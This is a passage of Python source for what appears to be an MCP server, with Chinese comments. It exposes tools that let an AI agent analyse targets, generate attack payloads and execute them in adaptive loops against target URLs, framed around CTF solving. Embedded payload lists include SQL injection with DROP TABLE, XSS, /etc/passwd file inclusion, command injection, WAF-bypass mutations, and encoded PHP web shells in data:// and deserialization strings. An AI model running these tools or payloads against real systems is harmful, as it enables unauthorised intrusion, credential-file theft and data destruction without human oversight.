        智能编排多目标自适应攻击

        Args:
            target_list: 目标列表，JSON格式字符串
            orchestration_mode: 编排模式 (balanced, aggressive, stealth, quick)

        Returns:
            包含智能编排结果的字典
        """
        try:
            import json

            # 解析目标列表
            try:
                targets = json.loads(target_list) if target_list else []
            except json.JSONDecodeError as e:
                return {
                    "success": False,
                    "error": f"JSON解析错误: {str(e)}",
                    "message": "请提供有效的JSON格式目标列表"
                }

            orchestration_results = []

            for i, target in enumerate(targets):
                # 为每个目标创建执行上下文
                session_id = f"orchestration_{int(time.time())}_{i}"
                context_id = adaptive_execution_engine.create_execution_context(
                    session_id=session_id,
                    target_info=target
                )

                # 基于编排模式选择策略
                strategy_mapping = {
                    "balanced": "auto",
                    "aggressive": "comprehensive",
                    "stealth": "stealth_scan",
                    "quick": "quick_scan"
                }

                strategy = strategy_mapping.get(orchestration_mode, "auto")

                # 执行自适应策略
                execution_result = adaptive_execution_engine.execute_adaptive_strategy(
                    context_id=context_id,
                    strategy_name=strategy
                )

                orchestration_results.append({
                    "target": target,
                    "context_id": context_id,
                    "execution_result": execution_result
                })

            # 汇总结果
            total_targets = len(targets)
            successful_executions = len([r for r in orchestration_results
                                       if r["execution_result"].get("success", False)])

            return {
                "success": True,
                "orchestration_mode": orchestration_mode,
                "total_targets": total_targets,
                "successful_executions": successful_executions,
                "success_rate": successful_executions / total_targets if total_targets > 0 else 0,
                "execution_results": orchestration_results,
                "message": f"智能编排完成: {successful_executions}/{total_targets} 个目标执行成功"
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": "智能编排失败"
            }


    # ==================== AI智能化核心工具 ====================
    # 这些工具专门设计给AI调用，实现真正的智能化CTF解题

    @mcp.tool()
    async def ai_intelligent_target_analysis(
        target_url: str,
        ai_analysis_context: str = "",
        analysis_depth: str = "comprehensive"
    ) -> Dict[str, Any]:
        """
        AI智能目标分析工具 - 让AI传入分析思路，获得结构化分析数据

        Args:
            target_url: 目标URL
            ai_analysis_context: AI的分析上下文和推理思路
            analysis_depth: 分析深度 (quick/standard/comprehensive/deep)

        Returns:
            结构化的目标分析数据，供AI进一步推理使用
        """
        try:
            logger.info(f"🧠 AI智能目标分析: {target_url}")
            logger.info(f"AI分析上下文: {ai_analysis_context}")

            # 创建分析会话
            analysis_session = {
                'session_id': str(uuid.uuid4()),
                'target': target_url,
                'ai_context': ai_analysis_context,
                'timestamp': datetime.now().isoformat(),
                'analysis_depth': analysis_depth
            }

            # 多层次技术指纹识别
            tech_fingerprints = await _ai_enhanced_tech_detection(target_url, ai_analysis_context)

            # 智能漏洞表面分析
            vulnerability_surface = await _ai_vulnerability_surface_mapping(target_url, tech_fingerprints)

            # 基于AI上下文的攻击向量推荐
            attack_vectors = _ai_attack_vector_recommendation(tech_fingerprints, vulnerability_surface, ai_analysis_context)

            # 智能端点发现
            endpoints = await _ai_endpoint_discovery(target_url, analysis_depth)

            # 生成AI友好的结构化报告
            analysis_report = {
                "session_id": analysis_session['session_id'],
                "target_intelligence": {
                    "url": target_url,
                    "technology_stack": tech_fingerprints,
                    "security_posture": vulnerability_surface,
                    "discovered_endpoints": endpoints,
                    "ai_analysis_integration": {
                        "context_applied": bool(ai_analysis_context),
                        "ai_insights": _extract_ai_insights(ai_analysis_context),
                        "recommended_approach": _ai_recommended_approach(tech_fingerprints, ai_analysis_context)
                    }
                },
                "attack_surface_map": {
                    "high_priority_vectors": attack_vectors['high_priority'],
                    "medium_priority_vectors": attack_vectors['medium_priority'],
                    "experimental_vectors": attack_vectors['experimental'],
                    "ai_custom_vectors": attack_vectors.get('ai_custom', [])
                },
                "intelligence_confidence": {
                    "technology_detection": tech_fingerprints.get('confidence', 0.8),
                    "vulnerability_assessment": vulnerability_surface.get('confidence', 0.7),
                    "attack_vector_relevance": attack_vectors.get('confidence', 0.9)
                },
                "ai_recommendations": {
                    "next_steps": _generate_ai_next_steps(tech_fingerprints, vulnerability_surface),
                    "payload_strategies": _suggest_payload_strategies(tech_fingerprints, ai_analysis_context),
                    "learning_opportunities": _identify_learning_opportunities(tech_fingerprints, vulnerability_surface)
                }
            }

            # 存储分析会话供后续使用
            global ai_analysis_sessions
            if 'ai_analysis_sessions' not in globals():
                ai_analysis_sessions = {}
            ai_analysis_sessions[analysis_session['session_id']] = analysis_report

            logger.info(f"✅ AI智能分析完成，会话ID: {analysis_session['session_id']}")
            return {
                "success": True,
                "analysis_session_id": analysis_session['session_id'],
                **analysis_report
            }

        except Exception as e:
            logger.error(f"AI智能目标分析失败: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AI智能目标分析失败"
            }

    @mcp.tool()
    async def ai_context_memory_store(
        session_id: str,
        context_type: str,
        ai_reasoning: str,
        data: str,
        confidence_score: float = 0.8
    ) -> Dict[str, Any]:
        """
        AI上下文记忆存储工具 - 让AI能够存储推理上下文和发现

        Args:
            session_id: 分析会话ID
            context_type: 上下文类型 (analysis/attack_result/learning/hypothesis)
            ai_reasoning: AI的推理过程描述
            data: 要存储的数据
            confidence_score: AI对这个发现的置信度

        Returns:
            存储结果确认
        """
        try:
            logger.info(f"🧠 AI存储上下文记忆: {context_type}")

            # 初始化全局记忆存储
            global ai_memory_store
            if 'ai_memory_store' not in globals():
                ai_memory_store = {}

            if session_id not in ai_memory_store:
                ai_memory_store[session_id] = {
                    'contexts': [],
                    'created_at': datetime.now().isoformat(),
                    'last_updated': datetime.now().isoformat()
                }

            # 创建记忆条目
            memory_entry = {
                'memory_id': str(uuid.uuid4()),
                'context_type': context_type,
                'ai_reasoning': ai_reasoning,
                'data': data,
                'confidence_score': confidence_score,
                'timestamp': datetime.now().isoformat(),
                'retrieval_count': 0
            }

            # 存储记忆
            ai_memory_store[session_id]['contexts'].append(memory_entry)
            ai_memory_store[session_id]['last_updated'] = datetime.now().isoformat()

            logger.info(f"✅ AI记忆已存储，记忆ID: {memory_entry['memory_id']}")
            return {
                "success": True,
                "memory_id": memory_entry['memory_id'],
                "session_id": session_id,
                "stored_context_type": context_type,
                "memory_count": len(ai_memory_store[session_id]['contexts']),
                "message": f"AI上下文记忆已存储 ({context_type})"
            }

        except Exception as e:
            logger.error(f"AI上下文记忆存储失败: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AI上下文记忆存储失败"
            }

    @mcp.tool()
    async def ai_context_memory_retrieve(
        session_id: str,
        query_description: str,
        context_types: List[str] = None
    ) -> Dict[str, Any]:
        """
        AI上下文记忆检索工具 - 让AI能够检索相关的历史推理和发现

        Args:
            session_id: 分析会话ID
            query_description: AI的查询描述
            context_types: 要检索的上下文类型列表

        Returns:
            相关的历史上下文和记忆
        """
        try:
            logger.info(f"🧠 AI检索上下文记忆: {query_description}")

            global ai_memory_store
            if 'ai_memory_store' not in globals() or session_id not in ai_memory_store:
                return {
                    "success": True,
                    "relevant_memories": [],
                    "message": "未找到相关记忆"
                }

            memories = ai_memory_store[session_id]['contexts']
            relevant_memories = []

            # 简单的相关性匹配（实际应用中可以使用更复杂的语义匹配）
            query_lower = query_description.lower()
            for memory in memories:
                # 更新检索计数
                memory['retrieval_count'] += 1

                # 检查上下文类型过滤
                if context_types and memory['context_type'] not in context_types:
                    continue

                # 检查相关性
                relevance_score = 0.0

                # 检查AI推理中的关键词匹配
                if any(word in memory['ai_reasoning'].lower() for word in query_lower.split()):
                    relevance_score += 0.4

                # 检查数据中的关键词匹配
                if any(word in memory['data'].lower() for word in query_lower.split()):
                    relevance_score += 0.3

                # 考虑置信度和时间因素
                relevance_score += memory['confidence_score'] * 0.2
                relevance_score += min(0.1, 1.0 / (memory['retrieval_count'] + 1)) # 常用记忆加分

                if relevance_score > 0.3:  # 相关性阈值
                    relevant_memories.append({
                        **memory,
                        'relevance_score': relevance_score
                    })

            # 按相关性排序
            relevant_memories.sort(key=lambda x: x['relevance_score'], reverse=True)

            logger.info(f"✅ AI记忆检索完成，找到 {len(relevant_memories)} 条相关记忆")
            return {
                "success": True,
                "query": query_description,
                "relevant_memories": relevant_memories[:10],  # 返回前10条最相关的
                "total_memories": len(memories),
                "relevance_threshold": 0.3,
                "message": f"找到 {len(relevant_memories)} 条相关记忆"
            }

        except Exception as e:
            logger.error(f"AI上下文记忆检索失败: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AI上下文记忆检索失败"
            }

    @mcp.tool()
    async def ai_smart_payload_generation(
        target_context: str,
        attack_type: str,
        ai_hypothesis: str,
        historical_feedback: str = "",
        creativity_level: float = 0.7
    ) -> Dict[str, Any]:
        """
        AI智能Payload生成工具 - 基于AI推理生成高质量攻击载荷

        Args:
            target_context: 目标上下文信息
            attack_type: 攻击类型
            ai_hypothesis: AI的攻击假设和推理
            historical_feedback: 从之前失败中学到的信息
            creativity_level: 创新程度 (0.0-1.0)

        Returns:
            AI生成的智能Payload列表
        """
        try:
            logger.info(f"🧠 AI智能Payload生成: {attack_type}")
            logger.info(f"AI假设: {ai_hypothesis}")

            # 解析目标上下文
            context_data = json.loads(target_context) if target_context.startswith('{') else {'info': target_context}

            # 基础Payload模板
            base_payloads = _get_base_payloads_for_ai(attack_type)

            # AI增强Payload生成
            ai_enhanced_payloads = []

            # 1. 基于AI假设的定制化Payload
            hypothesis_payloads = _generate_hypothesis_based_payloads(ai_hypothesis, attack_type, context_data)
            ai_enhanced_payloads.extend(hypothesis_payloads)

            # 2. 基于历史反馈的改进Payload
            if historical_feedback:
                feedback_payloads = _generate_feedback_improved_payloads(historical_feedback, attack_type, base_payloads)
                ai_enhanced_payloads.extend(feedback_payloads)

            # 3. 上下文自适应Payload
            context_payloads = _generate_context_adaptive_payloads(context_data, attack_type, creativity_level)
            ai_enhanced_payloads.extend(context_payloads)

            # 4. 创新性Payload（基于创新程度）
            if creativity_level > 0.5:
                creative_payloads = _generate_creative_payloads(attack_type, ai_hypothesis, creativity_level)
                ai_enhanced_payloads.extend(creative_payloads)

            # 5. 组合和变异Payload
            combination_payloads = _generate_combination_payloads(base_payloads, ai_enhanced_payloads, context_data)
            ai_enhanced_payloads.extend(combination_payloads)

            # 去重和质量评分
            unique_payloads = list(set(ai_enhanced_payloads))
            scored_payloads = []

            for payload in unique_payloads:
                quality_score = _calculate_payload_quality_score(payload, context_data, ai_hypothesis)
                scored_payloads.append({
                    'payload': payload,
                    'quality_score': quality_score,
                    'generation_method': _identify_generation_method(payload, ai_enhanced_payloads),
                    'ai_confidence': quality_score * creativity_level,
                    'expected_success_rate': _estimate_payload_success_rate(payload, context_data)
                })

            # 按质量评分排序
            scored_payloads.sort(key=lambda x: x['quality_score'], reverse=True)

            logger.info(f"✅ AI智能Payload生成完成，生成 {len(scored_payloads)} 个高质量Payload")
            return {
                "success": True,
                "attack_type": attack_type,
                "ai_hypothesis": ai_hypothesis,
                "generation_stats": {
                    "total_generated": len(scored_payloads),
                    "high_quality_count": len([p for p in scored_payloads if p['quality_score'] > 0.7]),
                    "creativity_level": creativity_level,
                    "context_applied": bool(target_context),
                    "feedback_applied": bool(historical_feedback)
                },
                "ai_generated_payloads": scored_payloads[:20],  # 返回前20个最佳Payload
                "payload_categories": {
                    "hypothesis_based": len(hypothesis_payloads),
                    "feedback_improved": len(feedback_payloads) if historical_feedback else 0,
                    "context_adaptive": len(context_payloads),
                    "creative": len(creative_payloads) if creativity_level > 0.5 else 0,
                    "combination": len(combination_payloads)
                },
                "message": f"AI生成了 {len(scored_payloads)} 个智能Payload，平均质量评分: {sum(p['quality_score'] for p in scored_payloads) / len(scored_payloads):.2f}"
            }

        except Exception as e:
            logger.error(f"AI智能Payload生成失败: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AI智能Payload生成失败"
            }

    @mcp.tool()
    async def ai_adaptive_attack_execution(
        attack_plan: str,
        target_url: str,
        ai_payloads: List[str],
        adaptation_strategy: str,
        success_criteria: str
    ) -> Dict[str, Any]:
        """
        AI自适应攻击执行工具 - 根据AI制定的计划执行智能攻击

        Args:
            attack_plan: AI制定的攻击计划
            target_url: 目标URL
            ai_payloads: AI生成的Payload列表
            adaptation_strategy: AI的适应策略
            success_criteria: AI定义的成功标准

        Returns:
            自适应攻击执行结果
        """
        try:
            logger.info(f"🧠 AI自适应攻击执行: {target_url}")
            logger.info(f"攻击计划: {attack_plan}")
            logger.info(f"适应策略: {adaptation_strategy}")

            execution_session = {
                'session_id': str(uuid.uuid4()),
                'target': target_url,
                'attack_plan': attack_plan,
                'adaptation_strategy': adaptation_strategy,
                'success_criteria': success_criteria,
                'start_time': datetime.now().isoformat(),
                'execution_log': []
            }

            attack_results = []
            adaptation_actions = []
            current_strategy = adaptation_strategy

            # 解析成功标准
            success_indicators = _parse_ai_success_criteria(success_criteria)

            # 执行AI制定的攻击计划
            for i, payload in enumerate(ai_payloads[:15]):  # 限制执行数量
                logger.info(f"执行Payload {i+1}/{min(15, len(ai_payloads))}: {payload[:50]}...")

                # 执行单个攻击
                attack_result = await _execute_single_ai_attack(target_url, payload, success_indicators)
                attack_results.append(attack_result)

                execution_session['execution_log'].append({
                    'payload_index': i,
                    'payload': payload,
                    'result': attack_result,
                    'timestamp': datetime.now().isoformat()
                })

                # 检查是否达到成功标准
                if _check_ai_success_criteria(attack_result, success_indicators):
                    logger.info(f"🎯 AI成功标准已达成！停止攻击")
                    break

                # AI自适应调整策略
                if i > 0 and i % 5 == 0:  # 每5次攻击后评估
                    adaptation_action = await _ai_adaptive_strategy_adjustment(
                        attack_results[-5:], current_strategy, adaptation_strategy
                    )

                    if adaptation_action['action_type'] != 'continue':
                        adaptation_actions.append(adaptation_action)
                        current_strategy = adaptation_action.get('new_strategy', current_strategy)
                        logger.info(f"🔄 AI策略自适应调整: {adaptation_action['action_type']}")

            # 分析执行结果
            execution_analysis = _analyze_ai_attack_execution(attack_results, success_indicators, adaptation_actions)

            # 提取发现的Flag
            flags_found = []
            for result in attack_results:
                if result.get('flags'):
                    flags_found.extend(result['flags'])

            logger.info(f"✅ AI自适应攻击执行完成，发现 {len(flags_found)} 个Flag")
            return {
                "success": True,
                "execution_session_id": execution_session['session_id'],
                "attack_execution_results": {
                    "total_attacks": len(attack_results),
                    "successful_attacks": len([r for r in attack_results if r.get('success')]),
                    "flags_discovered": flags_found,
                    "success_criteria_met": execution_analysis['success_criteria_met'],
                    "adaptation_actions": adaptation_actions
                },
                "ai_analysis": {
                    "attack_plan_effectiveness": execution_analysis['plan_effectiveness'],
                    "adaptation_effectiveness": execution_analysis['adaptation_effectiveness'],
                    "payload_quality_assessment": execution_analysis['payload_quality'],
                    "learning_insights": execution_analysis['learning_insights']
                },
                "execution_metrics": {
                    "success_rate": execution_analysis['success_rate'],
                    "average_response_time": execution_analysis['avg_response_time'],
                    "adaptation_trigger_count": len(adaptation_actions),
                    "execution_duration": execution_analysis['duration']
                },
                "message": f"AI自适应攻击完成 - 成功率: {execution_analysis['success_rate']:.1%}, 发现Flag: {len(flags_found)}"
            }

        except Exception as e:
            logger.error(f"AI自适应攻击执行失败: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AI自适应攻击执行失败"
            }

    @mcp.tool()
    async def ai_learning_feedback(
        session_id: str,
        success_patterns: str,
        failure_analysis: str,
        new_insights: str,
        confidence_score: float
    ) -> Dict[str, Any]:
        """
        AI学习反馈工具 - 让AI向系统反馈学习结果，持续改进

        Args:
            session_id: 攻击会话ID
            success_patterns: AI识别的成功模式
            failure_analysis: AI的失败分析
            new_insights: AI的新见解
            confidence_score: AI对这次学习的置信度

        Returns:
            学习反馈处理结果
        """
        try:
            logger.info(f"🧠 AI学习反馈处理...")

            # 初始化学习数据库
            global ai_learning_database
            if 'ai_learning_database' not in globals():
                ai_learning_database = {
                    'success_patterns': [],
                    'failure_analyses': [],
                    'insights': [],
                    'learning_sessions': {}
                }

            learning_entry = {
                'learning_id': str(uuid.uuid4()),
                'session_id': session_id,
                'success_patterns': success_patterns,
                'failure_analysis': failure_analysis,
                'new_insights': new_insights,
                'confidence_score': confidence_score,
                'timestamp': datetime.now().isoformat(),
                'applied_count': 0
            }

            # 存储学习结果
            if success_patterns:
                ai_learning_database['success_patterns'].append({
                    'pattern': success_patterns,
                    'confidence': confidence_score,
                    'session_id': session_id,
                    'timestamp': datetime.now().isoformat()
                })

            if failure_analysis:
                ai_learning_database['failure_analyses'].append({
                    'analysis': failure_analysis,
                    'confidence': confidence_score,
                    'session_id': session_id,
                    'timestamp': datetime.now().isoformat()
                })

            if new_insights:
                ai_learning_database['insights'].append({
                    'insight': new_insights,
                    'confidence': confidence_score,
                    'session_id': session_id,
                    'timestamp': datetime.now().isoformat()
                })

            ai_learning_database['learning_sessions'][session_id] = learning_entry

            # 分析学习质量
            learning_quality = _assess_ai_learning_quality(learning_entry)

            # 更新系统知识库
            knowledge_updates = _update_system_knowledge(learning_entry, learning_quality)

            logger.info(f"✅ AI学习反馈已处理，学习ID: {learning_entry['learning_id']}")
            return {
                "success": True,
                "learning_id": learning_entry['learning_id'],
                "learning_quality_assessment": learning_quality,
                "knowledge_updates": knowledge_updates,
                "learning_database_stats": {
                    "total_success_patterns": len(ai_learning_database['success_patterns']),
                    "total_failure_analyses": len(ai_learning_database['failure_analyses']),
                    "total_insights": len(ai_learning_database['insights']),
                    "total_learning_sessions": len(ai_learning_database['learning_sessions'])
                },
                "message": f"AI学习反馈已处理 - 质量评分: {learning_quality['overall_score']:.2f}"
            }

        except Exception as e:
            logger.error(f"AI学习反馈处理失败: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AI学习反馈处理失败"
            }

    @mcp.tool()
    async def ai_strategic_decision_making(
        current_situation: str,
        available_options: List[str],
        ai_reasoning: str,
        risk_tolerance: str = "medium"
    ) -> Dict[str, Any]:
        """
        AI战略决策制定工具 - 帮助AI在复杂情况下做出最优决策

        Args:
            current_situation: 当前情况描述
            available_options: 可用选项列表
            ai_reasoning: AI的推理过程
            risk_tolerance: 风险承受度 (low/medium/high)

        Returns:
            AI战略决策建议
        """
        try:
            logger.info(f"🧠 AI战略决策制定...")
            logger.info(f"当前情况: {current_situation}")

            decision_session = {
                'decision_id': str(uuid.uuid4()),
                'situation': current_situation,
                'options': available_options,
                'ai_reasoning': ai_reasoning,
                'risk_tolerance': risk_tolerance,
                'timestamp': datetime.now().isoformat()
            }

            # 分析每个选项
            option_analyses = []
            for option in available_options:
                analysis = _analyze_strategic_option(option, current_situation, ai_reasoning, risk_tolerance)
                option_analyses.append(analysis)

            # 生成决策矩阵
            decision_matrix = _generate_ai_decision_matrix(option_analyses, current_situation, risk_tolerance)

            # 推荐最佳选项
            best_option = max(option_analyses, key=lambda x: x['overall_score'])

            # 生成风险评估
            risk_assessment = _generate_risk_assessment(best_option, current_situation, risk_tolerance)

            # 生成执行建议
            execution_recommendations = _generate_execution_recommendations(best_option, decision_matrix)

            logger.info(f"✅ AI战略决策完成，推荐选项: {best_option['option']}")
            return {
                "success": True,
                "decision_session_id": decision_session['decision_id'],
                "strategic_analysis": {
                    "situation_assessment": current_situation,
                    "ai_reasoning_applied": ai_reasoning,
                    "risk_tolerance": risk_tolerance,
                    "options_analyzed": len(available_options)
                },
                "decision_recommendation": {
                    "recommended_option": best_option['option'],
                    "confidence_score": best_option['overall_score'],
                    "reasoning": best_option['reasoning'],
                    "expected_outcome": best_option['expected_outcome']
                },
                "option_analyses": option_analyses,
                "decision_matrix": decision_matrix,
                "risk_assessment": risk_assessment,
                "execution_recommendations": execution_recommendations,
                "alternative_options": sorted(option_analyses, key=lambda x: x['overall_score'], reverse=True)[1:3],
                "message": f"AI战略决策完成 - 推荐: {best_option['option']} (置信度: {best_option['overall_score']:.2f})"
            }

        except Exception as e:
            logger.error(f"AI战略决策制定失败: {e}")
            return {
                "success": False,
                "error": str(e),
                "message": "AI战略决策制定失败"
            }

    # ==================== AI智能化辅助函数 ====================

    async def _ai_enhanced_tech_detection(target_url: str, ai_context: str) -> Dict[str, Any]:
        """AI增强的技术检测"""
        # 基础技术检测
        tech_detection = {"success": False, "error": "本地执行模式"}

        # AI上下文增强
        ai_insights = _extract_ai_insights(ai_context)

        return {
            "detected_technologies": tech_detection.get("technologies", []),
            "ai_insights": ai_insights,
            "confidence": 0.85,
            "enhancement_applied": bool(ai_context)
        }

    async def _ai_vulnerability_surface_mapping(target_url: str, tech_fingerprints: Dict) -> Dict[str, Any]:
        """AI漏洞表面映射"""
        vulnerabilities = []
        confidence = 0.7

        # 基于技术栈推断漏洞
        for tech in tech_fingerprints.get("detected_technologies", []):
            if "php" in tech.lower():
                vulnerabilities.extend(["deserialization", "file_inclusion", "code_injection"])
            elif "mysql" in tech.lower():
                vulnerabilities.extend(["sql_injection", "blind_sql"])
            elif "apache" in tech.lower():
                vulnerabilities.extend(["path_traversal", "server_side_include"])

        return {
            "potential_vulnerabilities": vulnerabilities,
            "attack_surface_score": len(vulnerabilities) * 0.1,
            "confidence": confidence
        }

    def _ai_attack_vector_recommendation(tech_fingerprints: Dict, vulnerability_surface: Dict, ai_context: str) -> Dict[str, Any]:
        """AI攻击向量推荐"""
        high_priority = []
        medium_priority = []
        experimental = []
        ai_custom = []

        vulnerabilities = vulnerability_surface.get("potential_vulnerabilities", [])

        # 高优先级向量
        if "sql_injection" in vulnerabilities:
            high_priority.append("sql_injection")
        if "deserialization" in vulnerabilities:
            high_priority.append("deserialization")

        # 中优先级向量
        if "file_inclusion" in vulnerabilities:
            medium_priority.append("file_inclusion")
        if "xss" in vulnerabilities:
            medium_priority.append("xss")

        # 实验性向量
        experimental.extend(["xxe", "ssrf", "template_injection"])

        # AI自定义向量（基于AI上下文）
        if "ctf" in ai_context.lower():
            ai_custom.extend(["flag_extraction", "hidden_endpoints", "encoding_bypass"])

        return {
            "high_priority": high_priority,
            "medium_priority": medium_priority,
            "experimental": experimental,
            "ai_custom": ai_custom,
            "confidence": 0.9
        }

    async def _ai_endpoint_discovery(target_url: str, analysis_depth: str) -> List[str]:
        """AI端点发现"""
        # 基础端点发现
        endpoints = ["/", "/admin", "/login", "/api", "/config"]

        if analysis_depth in ["comprehensive", "deep"]:
            endpoints.extend(["/backup", "/test", "/dev", "/debug", "/flag"])

        return endpoints

    def _extract_ai_insights(ai_context: str) -> List[str]:
        """从AI上下文中提取见解"""
        insights = []
        if "php" in ai_context.lower():
            insights.append("PHP环境，关注反序列化和文件包含")
        if "ctf" in ai_context.lower():
            insights.append("CTF环境，重点寻找flag文件")
        if "sql" in ai_context.lower():
            insights.append("数据库相关，SQL注入概率高")
        return insights

    def _ai_recommended_approach(tech_fingerprints: Dict, ai_context: str) -> str:
        """AI推荐的攻击方法"""
        technologies = tech_fingerprints.get("detected_technologies", [])

        if any("php" in tech.lower() for tech in technologies):
            return "PHP环境：优先尝试文件包含、反序列化、代码注入"
        elif any("sql" in tech.lower() for tech in technologies):
            return "数据库环境：重点进行SQL注入测试"
        else:
            return "通用Web环境：从XSS和目录遍历开始"

    def _generate_ai_next_steps(tech_fingerprints: Dict, vulnerability_surface: Dict) -> List[str]:
        """生成AI下一步建议"""
        steps = []
        vulnerabilities = vulnerability_surface.get("potential_vulnerabilities", [])

        if "sql_injection" in vulnerabilities:
            steps.append("生成SQL注入Payload并测试")
        if "deserialization" in vulnerabilities:
            steps.append("构造反序列化Payload")

        steps.append("并行执行多种攻击向量")
        steps.append("监控响应并自适应调整策略")

        return steps

    def _suggest_payload_strategies(tech_fingerprints: Dict, ai_context: str) -> Dict[str, List[str]]:
        """建议Payload策略"""
        strategies = {
            "encoding": ["URL编码", "Unicode编码", "Base64编码"],
            "evasion": ["WAF绕过", "关键词替换", "注释插入"],
            "context": ["基于技术栈定制", "AI上下文增强"]
        }

        if "waf" in ai_context.lower():
            strategies["priority"] = strategies["evasion"]
        else:
            strategies["priority"] = strategies["context"]

        return strategies

    def _identify_learning_opportunities(tech_fingerprints: Dict, vulnerability_surface: Dict) -> List[str]:
        """识别学习机会"""
        opportunities = []

        if len(tech_fingerprints.get("detected_technologies", [])) > 3:
            opportunities.append("复杂技术栈组合分析")

        if vulnerability_surface.get("attack_surface_score", 0) > 0.5:
            opportunities.append("高风险目标攻击策略优化")

        opportunities.append("成功模式总结与应用")

        return opportunities

    # ==================== AI Payload生成辅助函数 ====================

    def _get_base_payloads_for_ai(attack_type: str) -> List[str]:
        """获取AI专用的基础Payload模板"""
        ai_payload_templates = {
            "sql_injection": [
                "' OR '1'='1'--",
                "' UNION SELECT NULL,NULL,NULL--",
                "'; DROP TABLE users--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>"
            ],
            "file_inclusion": [
                "../../../../etc/passwd",
                "php://filter/read=convert.base64-encode/resource=flag.php",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=",
                "../flag.txt"
            ],
            "command_injection": [
                "; cat /etc/passwd",
                "| whoami",
                "&& ls -la",
                "`id`",
                "$(cat flag.txt)"
            ],
            "deserialization": [
                'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}',
                'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}',
                'O:8:"stdClass":1:{s:4:"data";s:22:"<?php system($_GET[x]); ?>";}'
            ]
        }

        return ai_payload_templates.get(attack_type, ["test"])

    def _generate_hypothesis_based_payloads(ai_hypothesis: str, attack_type: str, context_data: Dict) -> List[str]:
        """基于AI假设生成Payload"""
        hypothesis_payloads = []
        hypothesis_lower = ai_hypothesis.lower()

        if "mysql" in hypothesis_lower and attack_type == "sql_injection":
            hypothesis_payloads.extend([
                "' AND (SELECT @@version)>0--",
                "' UNION SELECT @@version,@@datadir,@@hostname--",
                "' AND (SELECT COUNT(*) FROM mysql.user)>0--"
            ])

        if "php" in hypothesis_lower and attack_type == "file_inclusion":
            hypothesis_payloads.extend([
                "php://input",
                "php://filter/convert.base64-encode/resource=index.php",
                "expect://id"
            ])

        if "ctf" in hypothesis_lower:
            hypothesis_payloads.extend([
                "../../../../flag.txt",
                "flag.php",
                "../flag",
                "' UNION SELECT flag FROM flags--"
            ])

        return hypothesis_payloads

    def _generate_feedback_improved_payloads(historical_feedback: str, attack_type: str, base_payloads: List[str]) -> List[str]:
        """基于历史反馈改进Payload"""
        improved_payloads = []
        feedback_lower = historical_feedback.lower()

        if "waf" in feedback_lower or "blocked" in feedback_lower:
            # WAF绕过改进
            for payload in base_payloads[:3]:
                improved_payloads.extend([
                    payload.replace(" ", "/**/"),
                    payload.replace("'", "\\'"),
                    payload.replace("SELECT", "SEL/**/ECT"),
                    payload.replace("UNION", "UNI/**/ON")
                ])

        if "timeout" in feedback_lower:
            # 时间优化改进
            for payload in base_payloads[:2]:
                if "SLEEP" not in payload:
                    improved_payloads.append(f"'; SELECT SLEEP(1)--")

        return improved_payloads

    def _generate_context_adaptive_payloads(context_data: Dict, attack_type: str, creativity_level: float) -> List[str]:
        """生成上下文自适应Payload"""
        adaptive_payloads = []

        # 基于技术栈适应
        tech_stack = context_data.get("technology_stack", {})

        if tech_stack.get("detected_technologies"):
            for tech in tech_stack["detected_technologies"]:
                if "apache" in tech.lower() and attack_type == "file_inclusion":
                    adaptive_payloads.extend([
                        "/var/log/apache2/access.log",
                        "/etc/apache2/apache2.conf"
                    ])
                elif "nginx" in tech.lower():
                    adaptive_payloads.extend([
                        "/var/log/nginx/access.log",
                        "/etc/nginx/nginx.conf"
                    ])

        # 基于创新程度
        if creativity_level > 0.7:
            adaptive_payloads.extend([
                "data:text/html,<script>alert('creative')</script>",
                "javascript:alert('creative')",
                f"'; SELECT '{uuid.uuid4().hex[:8]}'--"
            ])

        return adaptive_payloads

    def _generate_creative_payloads(attack_type: str, ai_hypothesis: str, creativity_level: float) -> List[str]:
        """生成创新性Payload"""
        creative_payloads = []

        if creativity_level > 0.8:
            # 高创新度Payload
            if attack_type == "sql_injection":
                creative_payloads.extend([
                    f"'; SELECT '{random.randint(1000,9999)}'--",
                    "' OR '1'='1' AND '1'='1'--",
                    "' UNION SELECT CONCAT(username,':',password) FROM users--"
                ])
            elif attack_type == "xss":
                creative_payloads.extend([
                    f"<img src=x onerror=alert('{random.randint(1000,9999)}')>",
                    "<svg/onload=alert('creative')>",
                    "<details open ontoggle=alert('creative')>"
                ])

        return creative_payloads

    def _generate_combination_payloads(base_payloads: List[str], enhanced_payloads: List[str], context_data: Dict) -> List[str]:
        """生成组合和变异Payload"""
        combination_payloads = []

        # 简单组合
        if len(base_payloads) >= 2 and len(enhanced_payloads) >= 2:
            combination_payloads.append(f"{base_payloads[0]} AND {enhanced_payloads[0]}")
            combination_payloads.append(f"{base_payloads[1]} OR {enhanced_payloads[1]}")

        return combination_payloads

    def _calculate_payload_quality_score(payload: str, context_data: Dict, ai_hypothesis: str) -> float:
        """计算Payload质量评分"""
        score = 0.5  # 基础分

        # 长度适中加分
        if 10 <= len(payload) <= 100:
            score += 0.1

        # 包含关键词加分
        keywords = ["SELECT", "UNION", "alert", "script", "file", "etc", "flag"]
        for keyword in keywords:
            if keyword.lower() in payload.lower():
                score += 0.05

        # 与AI假设匹配加分
        if ai_hypothesis:
            hypothesis_keywords = ai_hypothesis.lower().split()
            for keyword in hypothesis_keywords:
                if keyword in payload.lower():
                    score += 0.1

        # 上下文相关性加分
        if context_data.get("technology_stack"):
            tech_stack = context_data["technology_stack"]
            if any(tech.lower() in payload.lower() for tech in tech_stack.get("detected_technologies", [])):
                score += 0.15

        return min(score, 1.0)

    def _identify_generation_method(payload: str, all_payloads: List[str]) -> str:
        """识别Payload生成方法"""
        if "/*" in payload:
            return "waf_bypass"
        elif any(char in payload for char in ["'", '"', ";"]):
            return "injection_based"
        elif "<" in payload and ">" in payload:
